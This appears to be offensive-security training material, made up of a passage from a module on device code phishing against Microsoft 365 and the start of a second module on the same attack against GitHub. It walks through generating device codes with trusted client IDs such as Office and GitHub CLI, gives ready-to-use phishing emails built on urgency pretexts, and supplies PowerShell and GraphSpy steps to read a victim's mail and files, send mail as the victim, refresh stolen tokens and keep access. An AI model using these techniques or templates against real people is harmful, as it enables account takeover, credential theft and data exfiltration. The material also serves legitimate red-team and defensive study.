- Authorization Server: The server that authenticates the resource owner, obtains their consent, and issues access tokens to the client.

- Resource Server: The API or service that hosts the protected resources and accepts access tokens from the client.

For example, if someone is authenticating to Microsoft then the resource owner would be the user logging into their Microsoft account, the client would be a third-party application requesting access, the authorization server would be Microsoft Entra ID which authenticates the user and issues tokens and the resource server would be the API hosting the protected resource such as Microsoft Graph API.

OAuth has several grant types such as Authorization Code, Client Credentials, and Device Code, with each having a different process for how a client obtains an access token. The focus in this module will be on the device code grant type.

### OAuth 2.0 Scopes
In OAuth 2.0, scopes define the specific permissions that an application is requesting from a user. When an application requests access to a user's resources, it must specify which scopes it needs. Scopes act as a permission boundary, limiting what the application can do with the access token it receives.

For example, in Microsoft's ecosystem, an application might request the `Mail.Read` scope to read emails, or the `Files.ReadWrite.All` scope to access and modify files in OneDrive. The user sees these requested scopes during the authorization process and must approve them before the application receives an access token.

Scopes implement the principle of least privilege in OAuth 2.0 security. An application should only request the minimum scopes necessary for its functionality. In a device code phishing attack, attackers typically request broad scopes to maximize their access to the victim's account. The permissions granted during the phishing attack determine what the attacker can access.

For example, Microsoft has the `Mail.Read` scope which allows for reading emails, while `Mail.ReadWrite` allows both reading and writing. Some common Microsoft Graph scopes include `User.Read` for basic profile information, `Mail.ReadWrite` for email access, `Files.ReadWrite.All` for OneDrive access, and `Calendars.ReadWrite` for calendar management.

For a complete list of Microsoft Graph permissions and scopes, see the Microsoft Graph permissions reference.

### Client IDs
In OAuth 2.0, a client ID is a public identifier for an application that wants to access user resources. When a developer creates an OAuth application, the authorization server assigns a unique client ID to that application. This identifier is used during the authorization flow to tell the authorization server which application is requesting access.

Client IDs serve several purposes in the OAuth flow. They allow the authorization server to identify which application is making the request, display the correct application name and information to the user during consent, track which applications have been authorized by users, and apply application-specific policies or rate limits.

Client IDs are public by design and are not considered secrets. They are embedded directly in client-side applications like mobile apps, desktop tools, and command-line utilities. Anyone can extract a client ID from an application by inspecting network traffic during the OAuth flow, decompiling or reverse engineering the application binary, or examining the application's source code if it is open source.

For example, if you monitor network requests during Microsoft Office authentication, you will see it sending the client ID `4765445b-32c6-49b0-83e6-1d93765276ca` in the device code request. This is the official Microsoft Office client ID, and it is the same for every installation of Microsoft Office worldwide.

Attackers select specific client IDs based on trust and familiarity. Using a well-known application's client ID makes the phishing attack significantly more effective because the victim sees a trusted application name on the authorization screen. An employee who sees "Authorize Microsoft Office" or "Authorize Microsoft Teams" is far more likely to approve the request than if they saw "Authorize Unknown Application" or a suspicious application name.

### Common Microsoft Client IDs
A dangerous aspect of device code phishing is that attackers can use the client IDs of legitimate, well-known Microsoft applications. When a victim sees the authorization screen, it displays the name of a trusted application they recognize and use regularly, making them far more likely to approve the request.

Microsoft's Entra ID ecosystem provides attackers with flexibility in their approach. While attackers can use client IDs from existing legitimate Microsoft applications (the preferred method for stealth), they could also register their own custom application in their own Azure AD tenant. However, registering a custom application requires the attacker to have an Entra ID tenant and results in the application name appearing on the victim's consent screen, which may raise suspicion if the name is unfamiliar. Therefore, most attackers prefer to use client IDs from well-known Microsoft applications to maximize trust and minimize detection.

Client IDs can be retrieved through multiple methods. The most straightforward approach is to intercept the OAuth flow by running the legitimate application while monitoring network traffic with tools like Wireshark, Fiddler, or browser developer tools.

For open-source applications or web applications, you can search the JavaScript source code or network requests. Microsoft also publishes some client IDs in their official documentation, and security researchers have compiled lists of commonly used Microsoft application client IDs.

- Microsoft Graph PowerShell uses client ID `14d82eec-204b-4c2f-b7e8-296a70dab67e`. This is one of the most commonly used client IDs in device code phishing attacks because IT administrators and security professionals regularly use Microsoft Graph PowerShell for automation and management tasks. When a victim sees "Authorize Microsoft Graph Command Line Tools" on the consent screen, they are unlikely to question it, especially if they work in IT.

- Microsoft Office uses client ID `4765445b-32c6-49b0-83e6-1d93765276ca`. Given that Microsoft Office is used by virtually every organization worldwide, this client ID provides maximum trust. Victims see "Microsoft Office" on the authorization screen, which is an application they interact with daily.

- Microsoft Azure PowerShell uses client ID `1950a258-227b-4e31-a9cf-717495945fc2`. This client ID is particularly effective when targeting IT administrators and cloud engineers who regularly use Azure PowerShell for infrastructure management.

- Microsoft Teams uses client ID `5e3ce6c0-2b1f-4285-8d4b-75ee78787346`. Teams is ubiquitous in modern enterprises, and victims are accustomed to authorizing Teams for various integrations and features.

Using these legitimate client IDs is completely valid within OAuth's design. Client IDs are public identifiers, not secrets, and the legitimate use case is that applications can be distributed across multiple platforms and devices while maintaining a consistent client ID. For example, when an employee installs Microsoft Teams on their laptop, it uses the same client ID as someone else's installation in a different organization. This design allows for seamless user experience and centralized application management. However, this same design also enables attackers to impersonate trusted applications without any technical barriers.

## Device Code Flow Walkthrough
As mentioned, the device code grant type will be the focus, and we will walk through a legitimate use case for the device code flow. When a constrained device needs to authenticate a user, it first requests a code from Microsoft. Microsoft then responds with a short device code, a verification URL (e.g. `https://microsoft.com/devicelogin`), and an expiration time, typically 15 minutes.

The constrained device displays instructions to the user telling them to visit the verification URL and enter the provided code. The user will then open a phone or laptop, navigate to the URL, and enter the code.

Once the user enters the code, Microsoft prompts them to log in with their Microsoft account credentials and complete MFA. After successful authentication, Microsoft asks the user to confirm whether they want to grant the device access, for example allowing an external app to connect to their Microsoft 365 data (e.g. OneDrive, Email, Calendar etc.).

While the user is going through the authentication and authorization process, the device continuously polls Microsoft's token endpoint every few seconds to check if the user has completed the authorization. Once the user approves, Microsoft issues access tokens to the device within the approved scopes, completing the authentication flow.

### Device Code Security Flaw
The primary issue with the device code flow is that Microsoft has no way to verify that the person who generated the code is the same person entering it. In an attack scenario, the attacker first generates a device code on their own computer and then sends that code to a victim. The victim unknowingly enters the code on the official Microsoft website. Once this happens, the attacker gains access to the victim's account because the victim has authorized the attacker's application.

The target will be interacting with the legitimate Microsoft domain to enter the device code, which makes the attack difficult to detect. The attack also circumvents MFA since the victim completes their MFA process prior to authorizing the application.

Once successful, it provides persistent access through refresh tokens that can remain valid for months, enabling long-term access without the need for re-authentication. The entire process takes place within familiar Microsoft login pages, which users are trained to trust, making the experience appear completely legitimate.

### Device Code Phishing Limitations
Device code phishing has several constraints that affect its execution. The device code expires within 15 minutes, meaning the attacker must act quickly and the victim needs to be online and responsive during that time window. Access is also restricted to the permissions the target approves, the activity leaves audit trails in Microsoft logs, and conditional access policies can block the attack.

Organizational defenses can reduce this risk through Conditional Access Policies. For example, the policy below will block the use of the device code flow from any unmanaged or non-compliant devices by enforcing conditional access rules.

```
# Block device code flow from unmanaged devices
New-AzureADMSConditionalAccessPolicy -DisplayName "Block Device Code Flow" `
  -State "Enabled" -Conditions $conditions -GrantControls $grantControls

```
This ensures that only devices meeting organizational compliance requirements can complete the device code flow, preventing attackers from abusing it on personal or untrusted machines. Application Consent Policies provide another layer of defense by blocking unverified applications, requiring admin consent for sensitive permissions, and monitoring suspicious app registrations.

## Understanding the Device Code Phishing Attack Flow
Before performing the attack, we need to understand how the complete flow works from the attacker's perspective. The attacker begins by generating a device code and then uses social engineering to deliver it to the victim. The victim enters this code on the legitimate Microsoft authentication page, unknowingly granting the attacker access to their account.

After receiving the device code, the attacker uses social engineering to deliver it to the victim. The victim receives instructions to visit the Microsoft device login page and enter the provided code.

The victim visits the legitimate Microsoft website, enters the code, and proceeds through the authentication process including MFA. Microsoft then prompts the victim to authorize the application.

While the victim is authenticating, the attacker's tool continuously polls Microsoft's token endpoint. Once the victim authorizes the application, Microsoft issues the tokens to the attacker, completing the attack.

## Performing Device Code Phishing
Now that we understand the attack flow, we will perform the attack step by step. We will use TokenTacticsV2 to automate the device code generation and token acquisition process, craft a phishing message to deliver to the victim, and finally obtain access to the victim's Microsoft 365 account.

### Step 1: Setting Up the Environment
Start by cloning the TokenTacticsV2 GitHub repository to your local machine. At the time of writing, there are some syntax issues in the official repository, therefore we will use this fork which includes the necessary fixes:

```
git clone https://github.com/Hexix23/TokenTacticsV2.git

```
This command downloads the TokenTacticsV2 repository from GitHub to your current directory. TokenTacticsV2 is a PowerShell module that automates Microsoft device code phishing attacks and token management. Navigate into the TokenTacticsV2 directory and import the TokenTactics module into your PowerShell session:

```
cd TokenTacticsV2

Import-Module .\TokenTactics.psd1

```
The `Import-Module` command loads the TokenTactics module into your current PowerShell session, making all of its functions available for use. The module provides various cmdlets for generating device codes, managing tokens, and interacting with Microsoft services. The exported functions can be found here.

### Step 2: Generating the Device Code
Next, we will generate a device code for Microsoft Graph access. The `-Client` parameter specifies which Microsoft application client ID to use, determining what resources and scopes will be requested. Each client has predefined scopes associated with it:

```
Get-AzureToken -Client MSGraph

```
The `MSGraph` client requests access to Microsoft Graph API, which provides broad access to Microsoft 365 services including user profiles, emails, files, and calendar data. This is the most comprehensive option for accessing multiple Microsoft services through a single token.

TokenTacticsV2 supports multiple client options, each targeting different Microsoft services:

```
# Target Microsoft Graph (comprehensive access)
Get-AzureToken -Client MSGraph

# Target Outlook/Exchange (email access)
Get-AzureToken -Client Outlook

# Target Microsoft Teams (Teams messages and channels)
Get-AzureToken -Client MSTeams

# Target SharePoint (document libraries and sites)
Get-AzureToken -Client SharePoint

```
Each client uses a different application ID and requests different scopes. For example, the Outlook client focuses on email-related scopes like `Mail.ReadWrite` and `Contacts.ReadWrite`, while MSGraph requests broader scopes including `User.Read`, `Mail.ReadWrite`, `Files.ReadWrite.All`, and `Calendars.ReadWrite`.

Once the above command is executed, it will result in an output that contains the device code, the URL to enter the code and the expiry time.

```
# Sample output
Device Code: GZRPQX9FH
Verification URL: https://microsoft.com/devicelogin
Expires in: 15 minutes

```

### Step 3: Delivering the Phishing Message
Deliver the code to the victim using a delivery method of your choice. For example, a sample email asking user to input the previously generated device code is shown below.

```
Dear [NAME],

Our security team detected unusual activity on your Microsoft account. To verify your identity and secure your account:

1. Go to: https://microsoft.com/devicelogin
2. Enter code: GZRPQX9FH
3. Complete the verification process

This code expires in 15 minutes. Please act immediately.

IT Security Team

```

### Step 4: Waiting for Victim Authorization
Assuming the user follows the instructions in step 3, they will enter the device code you provided and authenticate with their credentials, including multi-factor authentication. When they reach the permission consent screen, they must click "Accept" to successfully grant us access to their tokens.

If the victim has an active browser session, they'll be prompted to select their account. This page displays the application name (in this case "Microsoft Office") and shows the country where the device code was generated. The country information can sometimes alert suspicious users if the location is unexpected, though many users work with distributed teams or use VPNs, making unusual locations less suspicious.

The application name displayed depends on the client ID used by TokenTacticsV2. Each predefined client in TokenTacticsV2 corresponds to a legitimate Microsoft application, so the victim sees familiar application names like "Microsoft Office", "Microsoft Teams", or "Outlook" rather than a suspicious third-party application. This makes the authorization request appear legitimate and trustworthy.

Microsoft displays the app permissions request. At this point, the victim unknowingly authorizes the attacker's application:

After authorization, Microsoft shows a confirmation page to the user:

### Step 5: Receiving the Access Tokens
Back in the attacker's PowerShell session, the JWT tokens are received and stored in the `$response` variable:

```
# Access token (valid for 1 hour)
$response.access_token

# Refresh token (valid for months)
$response.refresh_token

```

In the next section, we will discuss how to use the acquired tokens.

## Token Usage Via Direct API Calls
Once you have obtained the access token, you can use it to interact directly with Microsoft Graph API using PowerShell's `Invoke-RestMethod` cmdlet. This method works reliably with tokens obtained from device code phishing attacks.

Microsoft Graph API provides access to Microsoft 365 services including user profiles, emails, OneDrive files, calendars, and more. We will demonstrate a few uses and endpoint calls, however, for a complete list of available endpoints and their capabilities, see the Microsoft Graph REST API v1.0 reference.

- Retrieve the victim's profile information:

```
$headers = @{
    "Authorization" = "Bearer $($response.access_token)"
    "Content-Type" = "application/json"
}
$userProfile = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers -Method Get

# View the full profile information
$userProfile | Format-List

# Or view specific properties
$userProfile | Select-Object displayName, mail, jobTitle, department, mobilePhone | Format-List

```
The `Invoke-RestMethod` cmdlet sends an HTTP GET request to the `/me` endpoint. The `$headers` hashtable includes the stolen access token in the `Authorization` header as a Bearer token. This returns detailed information about the currently authenticated user, including their display name, email address, job title, department, and phone numbers. Using `Format-List` displays all properties in a readable vertical format.

- Access the victim's emails:

```
$headers = @{
    "Authorization" = "Bearer $($response.access_token)"
    "Content-Type" = "application/json"
}
$messages = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers -Method Get

# View the full output in a readable format
$messages.value | Format-List

# Or view specific properties
$messages.value | Select-Object subject, from, receivedDateTime | Format-Table

```
The `/me/messages` endpoint returns the victim's email messages. By default, PowerShell truncates the output, so storing the result in a variable (`$messages`) and using `Format-List` or `Select-Object` allows you to view the complete data in a readable format. You can modify the URI to include query parameters like `?$top=10` to limit results or `?$filter` to search for specific emails.

- List files in the victim's OneDrive:

```
$headers = @{
    "Authorization" = "Bearer $($response.access_token)"
    "Content-Type" = "application/json"
}
$files = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" -Headers $headers -Method Get

# View the full output in a readable format
$files.value | Format-List

# Or view specific properties
$files.value | Select-Object name, size, createdDateTime, webUrl | Format-Table

```
The `/me/drive/root/children` endpoint returns all files and folders in the root directory of the victim's OneDrive. Storing the result in a variable and using `Format-List` or `Select-Object` displays the complete file information in a readable format, allowing you to browse their file structure and identify sensitive documents.

- Send an email as the victim:

```
$headers = @{
    "Authorization" = "Bearer $($response.access_token)"
    "Content-Type" = "application/json"
}

$emailBody = @{
    message = @{
        subject = "Test Email"
        body = @{
            contentType = "Text"
            content = "This is a test email sent via Microsoft Graph API"
        }
        toRecipients = @(
            @{
                emailAddress = testuser@test.com"
                }
            }
        )
    }
} | ConvertTo-Json -Depth 10

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/sendMail" -Headers $headers -Method Post -Body $emailBody

```
The `/me/sendMail` endpoint allows you to send emails on behalf of the victim. The email content is structured as a JSON object with the message subject, body, and recipients.

## Token Usage Via GraphSpy
GraphSpy is a powerful web-based tool designed specifically for exploiting Microsoft Graph tokens. Unlike command-line approaches, GraphSpy provides an intuitive graphical interface that makes token exploitation accessible and efficient. The tool visualizes the victim's Microsoft 365 environment in a familiar interface similar to the actual Microsoft services, providing organized access to Outlook, OneDrive, Teams, SharePoint, contacts, calendars, and more.

GraphSpy automatically handles token refresh and manages multiple tokens simultaneously, maintaining persistent access as long as the refresh token remains valid. The interface allows you to read and send emails, browse and upload files, access Teams conversations, enumerate organizational structure, and download sensitive documents, all through an easy-to-navigate web interface. For a complete overview of all features and capabilities, refer to the GraphSpy documentation.

First, install `pipx`, which is a tool for installing and running Python applications in isolated environments:

```
apt install pipx

```
After installing pipx, ensure it is added to your system `PATH`:

```
pipx ensurepath

```
The `ensurepath` command modifies your shell configuration to include pipx binaries in your PATH, allowing you to run installed applications from any directory. You may need to restart your terminal or run `source ~/.bashrc` (or equivalent for your shell) for this change to take effect.

Install GraphSpy from PyPI using pipx:

```
pipx install graphspy

```
This command downloads and installs GraphSpy in an isolated Python environment, preventing conflicts with other Python packages on your system.

Launch the GraphSpy web interface:

```
graphspy

```
This command starts a local web server that hosts the GraphSpy interface. By default, it runs on `http://127.0.0.1:5000`, though this may vary depending on your configuration.

Once GraphSpy is running, it will start a local web server (typically on `http://127.0.0.1:5000`). Open your browser and navigate to this address to access the GraphSpy interface.

To import your stolen tokens, click on the "Import Token" button in the top navigation bar. You will see a form where you can paste either an access token or a refresh token. After pasting the token, click the "Import" button to add it to GraphSpy's token manager.

### GraphSpy: Outlook Access
Once tokens are imported, navigate to the "Outlook" section by clicking on the "Outlook" button in the left sidebar. This will display the victim's mailbox where you can read emails, send messages, and manage their inbox. You can click on individual emails to view their full content, attachments, and metadata.

### GraphSpy: File Operations
To access the victim's OneDrive, click on the "OneDrive" button in the left sidebar. GraphSpy will display the victim's file structure, allowing you to browse folders and view files. You can upload files by clicking the "Upload" button at the top of the file browser, which enables you to upload malware, backdoors, or exfiltrate sensitive documents from the victim's account.

## Renewing Tokens
It's worth noting that access tokens are short-lived (typically 1 hour) but can be renewed using the refresh token without requiring the victim to authenticate again. The refresh token can remain valid for a longer period, providing long-term access to the victim's account.

To manually renew an access token, you need to make a POST request to Microsoft's token endpoint with the refresh token. The request includes several parameters:

- `client_id`: The application ID that was used to generate the original device code. In this case, we use the Microsoft Office client ID (`4765445b-32c6-49b0-83e6-1d93765276ca`), which is the same ID used by TokenTacticsV2.

- `refresh_token`: The refresh token obtained from the initial authentication. This token proves that the user previously authorized the application.

- `grant_type`: Set to `"refresh_token"` to indicate that we are exchanging a refresh token for a new access token, rather than using other OAuth flows like device code or authorization code.

- `scope`: The permissions we want for the new access token. Using `https://graph.microsoft.com/.default` requests the same scopes that were originally granted.

```
# Extract refresh token from response
$refresh_token = $response.refresh_token

# Create the request body with required parameters
$body = @{
    client_id = "4765445b-32c6-49b0-83e6-1d93765276ca"  # Microsoft Office client ID
    refresh_token = $refresh_token
    grant_type = "refresh_token"
    scope = "https://graph.microsoft.com/.default"
}

# Request a new access token
$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method POST -Body $body
$new_access_token = $response.access_token

```
The response will contain a new access token that can be used for another hour. The refresh token may also be renewed in the response, extending the attacker's access even further.

## Demo
The video can be found in folder: `./videos/poc-final.mov`

## Resources

- Microsoft Graph REST API v1.0 Reference

- Microsoft Graph Permissions Reference

- TokenTacticsV2 GitHub Repository

- TokenTacticsV2 Official Repository

- GraphSpy GitHub Repository

- OAuth 2.0 Device Authorization Grant (RFC 8628)

- OAuth 2.0 Authorization Framework (RFC 6749)

## Objectives
Download TokenTactics and perform a device code phishing attack

Use the captured token to perform enumeration via Microsoft's Graph API

Download GraphSpy, import the captured token and perform various account operations


---

# Novo Módulo 19 — Phishing via Device Code GitHub

Novo Módulo 19 — Phishing via Device Code GitHub

- # Novo Módulo 19 — Phishing via Device Code GitHub

# Disclaimer
# Module 19 - GitHub Device Code Phishing

## Introduction
Device Authorization Grant, also known as Device Code Flow, is an OAuth 2.0 protocol designed for devices with limited input capabilities such as Smart TVs, IoT devices, and command-line tools. This flow allows users to authenticate by entering a code on a separate device with a browser, thereby enabling secure access without requiring direct credential entry on the limited device.GitHub's authentication system includes support for the device code flow, as outlined in their official documentation. However, this support also introduces the risk of Device Code Phishing, a technique that exploits GitHub's OAuth 2.0 device code authentication flow to obtain authentication tokens and gain unauthorized access to a target user's repositories, organizations, and sensitive development resources. GitHub device code phishing was first described in Praetorian's blog post Introducing: GitHub Device Code Phishing.In the context of GitHub, this attack provides attackers with access to private source code, organizational secrets, CI/CD pipelines, and deployment keys. Unlike traditional phishing attacks that require fake login pages, device code phishing leverages legitimate GitHub domains, making it difficult to detect even for security-aware developers.In this module, we will explore the OAuth 2.0 device code flow from the ground up, examine its legitimate use cases, and understand how attackers abuse this flow to compromise GitHub accounts. We will perform a complete device code phishing attack using both manual techniques and automated tools that we have developed for you, demonstrate how to leverage stolen tokens to access repositories and organizations, and implement SSH key persistence for long-term access.
This module will re-explain OAuth basics. If you completed the previous module, you can skip over the introductory sections.

## OAuth2.0
Before diving into device code phishing, we must understand the underlying protocol. OAuth 2.0 is an authorization protocol that allows third party applications to access user resources without needing to handle or store passwords. OAuth 2.0 relies on access tokens, which are data objects that grant applications authorization to interact with protected resources on behalf of the end user.
### OAuth 2.0 Roles
OAuth 2.0 defines four distinct roles that work together to enable secure authorization:
Resource Owner: The user or entity that owns the data and grants access to it.

- Client: The application requesting access to the resource owner's data on their behalf.

- Authorization Server: The server that authenticates the resource owner, obtains their consent, and issues access tokens to the client.

- Resource Server: The API or service that hosts the protected resources and accepts access tokens from the client.

For example, if someone is authenticating to GitHub, the resource owner would be the user logging into their GitHub account, the client would be a third-party application like GitHub CLI requesting access, the authorization server would be GitHub's OAuth server which authenticates the user and issues tokens, and the resource server would be the GitHub API hosting the protected resources such as repositories, organizations, and user data.

OAuth has several grant types such as Authorization Code, Client Credentials, and Device Code, with each having a different process for how a client obtains an access token. The focus in this module will be on the device code grant type, which is specifically designed for input-constrained devices but can be exploited for phishing attacks. For more information on OAuth 2.0 grant types, see the OAuth 2.0 Authorization Framework.

### OAuth 2.0 Scopes
In OAuth 2.0, scopes define the specific permissions that an application is requesting from a user. When an application requests access to a user's resources, it must specify which scopes it needs. Scopes act as a permission boundary, limiting what the application can do with the access token it receives. Each provider (Microsoft, Google, GitHub, etc.) has their own scopes, meaning that the scopes for Microsoft's OAuth 2.0 protocol are completely different from those found in GitHub, but they serve the same function.

For example, in GitHub, an application might request the `repo` scope to access private repositories, or the `user:email` scope to read the user's email addresses. The user will see these requested scopes during the authorization process and must approve them before the application receives an access token. On the other hand, write scopes are more privileged than read scopes, and admin scopes provide the highest level of access. For example, `write:org` is more privileged than `read:org`, and `admin:org` is more privileged than `write:org`. Attackers can request multiple scopes simultaneously to maximize their access, such as `repo,admin:org,workflow` for maximum impact or `repo,user:email` for stealth access.

Scopes are critical for security because they implement the principle of least privilege. An application should only request the minimum scopes necessary for its functionality. However, as we'll see later, in a device code phishing attack, attackers typically request broad scopes to maximize their access to the victim's account. Understanding scopes is essential because the permissions granted during the phishing attack determine what the attacker can access.

#### Authorization Prompt
As previously mentioned, the user will be presented with the application’s requested scopes and must grant permission before access is allowed. For example, GitHub CLI typically requests the `repo,user,user:email,write:public_key` scopes, which will show the user the following prompt:

```
This application will be able to:
• Access your private repositories (repo)
• Read and write your profile information (user)
• Read your email addresses (user:email)
• Manage your SSH keys (write:public_key)

```
On the other hand, an organization management tool might request the `repo,write:org,read:org,workflow` scopes, which will show the user the following prompt:

```
This application will be able to:
• Access your private repositories (repo)
• Read and write organization membership (write:org)
• Read organization information (read:org)
• Update GitHub Actions workflows (workflow)

```
To see the complete list of GitHub scopes, you can refer to their official documentation.

### Client IDs
Client IDs were discussed in detail in the previous Microsoft Device Code Phishing module. The concept remains the same for GitHub: client IDs are public identifiers that OAuth applications use to identify themselves during the authorization flow. They are embedded in applications and can be extracted through network traffic inspection, source code analysis, or reverse engineering.

For example, when using GitHub CLI to make authenticated API requests, you can observe the client ID being sent in the request headers by enabling debug mode. The following command demonstrates this:

```
DEBUG=api gh api orgs/Maldev-Academy/hooks | tee /tmp/check

```
The `DEBUG=api` environment variable enables debug output for the GitHub CLI, showing all HTTP requests and responses. The `gh api` command makes an authenticated API call to retrieve webhooks for the `Maldev-Academy` organization. The `| tee /tmp/check` pipes the output to both the terminal and saves it to `/tmp/check` for inspection. When you run this command, the debug output will reveal the client ID `178c6fc778ccc68e1d6a` being used in the OAuth flow.

### Common GitHub Client IDs
As discussed in the Microsoft module, attackers leverage legitimate application client IDs to maximize trust during the authorization process. The same principle applies to GitHub, where developers regularly interact with trusted applications and are conditioned to approve their authorization requests.

- The GitHub CLI uses client ID `178c6fc778ccc68e1d6a`. This is the most commonly used client ID in device code phishing attacks because developers are extremely familiar with GitHub CLI and regularly authorize it as part of their normal workflow. When a victim sees "Authorize GitHub CLI" on the consent screen, they are unlikely to question it.

- GitHub Desktop uses client ID `de7becede97fcfe8b1e0`. Many developers use GitHub Desktop for repository management, making this another trusted application name that victims will recognize and approve without suspicion.

- The VS Code GitHub Extension uses client ID `01ab8ac9400c4e429b23`. Given the popularity of Visual Studio Code among developers, this client ID works well for phishing attacks targeting VS Code users.

- Git Credential Manager uses client ID `0120e057bd645470c1ed`. This application is commonly used for Git authentication, and developers are accustomed to authorizing it for repository access.

## GitHub Device Code Flow Walkthrough
To understand how device code phishing works, we must first examine the legitimate device code flow. When a constrained device such as GitHub CLI needs to authenticate a user, it initiates a multi-step process that separates the authentication from the device itself.

First, the device sends a request to GitHub's device code endpoint, specifying the client ID of the application and the scopes it requires. GitHub responds with three critical pieces of information: a device code, a user code, and a verification URL. The device code is a long string that the application will use to poll for tokens. The user code is a short, human-readable code that the user will enter. The verification URL is the legitimate GitHub page where the user will complete the authentication.

The device then displays instructions to the user, telling them to visit the verification URL and enter the user code. Meanwhile, the device begins polling GitHub's token endpoint every few seconds, asking if the user has completed the authorization.

The user opens a browser on their phone or laptop, navigates to the verification URL, and enters the user code. GitHub then prompts the user to log in with their credentials, including any multi-factor authentication they have enabled. After successful authentication, GitHub displays a consent screen showing which application is requesting access and which scopes it is requesting. The user must click "Authorize" to grant the application access.

Once the user authorizes the application, GitHub's token endpoint responds to the device's polling requests with an access token and refresh token. The device can now use these tokens to access the user's GitHub resources within the approved scopes.

### GitHub Device Code Security Flaw
The fundamental security flaw in the device code flow is that GitHub cannot verify that the person who generated the code is the same person entering it. The protocol was designed with the assumption that the device displaying the code is trusted and that the user understands they should only enter codes from devices they control.

In an attack scenario, this assumption breaks down completely. An attacker generates a device code on their own computer, requesting broad permissions like repository access and organization administration. The attacker then sends this code to a victim through a phishing message, disguised as a legitimate security notification or system requirement. The victim, believing they are responding to a genuine request from GitHub, visits the legitimate GitHub verification URL and enters the code.

From GitHub's perspective, this looks like a normal device code flow. The user authenticated with their credentials, completed their multi-factor authentication, and explicitly clicked "Authorize" on the consent screen. GitHub has no way to know that the device polling for tokens belongs to an attacker rather than the user's own device.

This attack is particularly effective because the victim interacts only with legitimate GitHub domains. There are no fake login pages to detect, no suspicious URLs to flag, and no phishing infrastructure to take down. The entire attack leverages GitHub's own authentication system, making it extremely difficult for both users and security systems to identify as malicious.

## Device Code Phishing Limitations
Device code phishing has important constraints that impact both attack success and defense strategies. Understanding these limitations helps with realistic threat modeling.

The device code expires within 15 minutes of generation. This creates a tight window for the attack, requiring the victim to be online, check their messages, and complete the authorization process quickly. If the victim is in a meeting, away from their computer, or simply takes too long to respond, the code expires and the attack fails.

The attack requires active victim participation. Unlike credential theft or session hijacking, device code phishing cannot succeed without the victim explicitly entering the code and clicking "Authorize". This means the social engineering component must be convincing enough to motivate immediate action.

Many organizations implement OAuth application restrictions that can block device code phishing. GitHub Enterprise allows administrators to restrict which OAuth applications can be authorized, require admin approval for new applications, or block the device code flow entirely for unmanaged devices.

GitHub logs all OAuth authorizations, creating an audit trail that can be used for detection and investigation. Security teams monitoring OAuth activity may notice unusual authorization patterns, especially if multiple users authorize the same application in a short time period.

Conditional access policies in GitHub Enterprise can restrict device code flow based on network location, device compliance, or other factors. Organizations with strict conditional access policies may block device code authorizations from untrusted networks or devices.

## Performing GitHub Device Code Phishing
We will now walk through executing a complete device code phishing attack against a GitHub account. This demonstration will use manual techniques to ensure you understand each step of the process before exploring automated tools.

### Step 1: Generating the Device Code
The first step is to generate a device code by sending a POST request to GitHub's device code endpoint. This request must include the client ID of the application we are impersonating and the scopes we want to request.

```
curl -X POST https://github.com/login/device/code \
  -H "Accept: application/json" \
  -d "client_id=178c6fc778ccc68e1d6a" \
  -d "scope=repo,user,admin:org,workflow,write:public_key" | jq

```
Breaking down this command, the `-X POST` flag specifies that we are making a POST request to the endpoint. The `-H "Accept: application/json"` header tells GitHub we want the response in JSON format rather than URL-encoded format. The `-d "client_id=178c6fc778ccc68e1d6a"` parameter specifies the client ID of GitHub CLI, which is a trusted application that developers authorize regularly. The `-d "scope=repo,user,admin:org,workflow,write:public_key"` parameter requests five powerful scopes that together provide comprehensive access to the victim's account.

The `repo` scope grants access to all private repositories. The `user` scope provides access to profile information and email addresses. The `admin:org` scope grants full control over any organizations the victim belongs to. The `workflow` scope allows modifying GitHub Actions workflows for supply chain attacks. The `write:public_key` scope enables adding SSH keys for persistent access.

GitHub responds with a JSON object containing several critical fields:

```
{
  "device_code": "3584d83530557fdd1f46af8289938c8ef79f9dc5",
  "user_code": "WDJB-MJHT",
  "verification_uri": "https://github.com/login/device",
  "verification_uri_complete": "https://github.com/login/device?user_code=WDJB-MJHT",
  "expires_in": 900,
  "interval": 5
}

```
The `device_code` field contains a long hexadecimal string that we will use when polling for tokens. This code is not shown to the user and should be kept secure on the attacker's system. The `user_code` field contains a short, human-readable code like "WDJB-MJHT" that the victim will enter on the GitHub website. The `verification_uri` field is the URL where the victim will enter the code, which is always the legitimate GitHub domain. The `verification_uri_complete` field is a convenience URL that pre-fills the user code, though using this in phishing messages may appear suspicious. The `expires_in` field indicates the code is valid for 900 seconds (15 minutes). The `interval` field tells us to poll for tokens every 5 seconds.

The following image shows the actual response from GitHub when generating a device code:

### Step 2: Crafting the Phishing Message
The success of a device code phishing attack heavily depends on the quality of the social engineering. The phishing message must convince the victim to immediately visit the GitHub URL and enter the code. The pretext should align with the requested scopes and the victim's role.

For attacks requesting SSH key access, a security-focused pretext is most effective:

```
Subject: [ACTION REQUIRED] GitHub SSH Key Security Update

GitHub is implementing new SSH key security measures to protect against 
unauthorized access. To maintain your repository access and avoid service 
interruption:

1. Go to: https://github.com/login/device
2. Enter code: WDJB-MJHT
3. Authorize GitHub CLI security update

This security update expires in 15 minutes. Please complete this 
verification immediately to avoid losing access to your repositories.

GitHub Security Team

```
This message creates urgency through the expiration time, uses legitimate GitHub URLs that will pass security filters, and requests authorization of GitHub CLI which developers use regularly. The threat of losing repository access motivates immediate action.

For attacks targeting organization access, a compliance-focused pretext is more appropriate:

```
Subject: [CRITICAL] Organization Security Audit Required

Your organization requires immediate security verification to maintain 
compliance with our updated security policies. Failure to complete this 
audit may result in restricted access to organizational resources.

1. Visit: https://github.com/login/device  
2. Enter audit code: WDJB-MJHT
3. Authorize GitHub CLI for security audit

Critical compliance deadline: 15 minutes remaining.

IT Security Team

```
This message leverages organizational authority and compliance requirements, which developers are conditioned to respond to quickly. The mention of restricted access creates fear of disrupting their work. For attacks targeting CI/CD access, a technical operations pretext works well:

```
Subject: GitHub Actions Workflow Update Required

We are deploying critical security patches to GitHub Actions workflows 
across all repositories. Your authorization is required to update your 
workflow configurations:

1. Navigate to: https://github.com/login/device
2. Input authorization code: WDJB-MJHT  
3. Approve GitHub CLI workflow update

Deployment window closes in 15 minutes.

DevOps Team

```
This message targets developers who regularly work with CI/CD pipelines and are accustomed to workflow updates. The technical language and deployment window create a sense of operational urgency.

### Step 3: Waiting for Victim Authorization
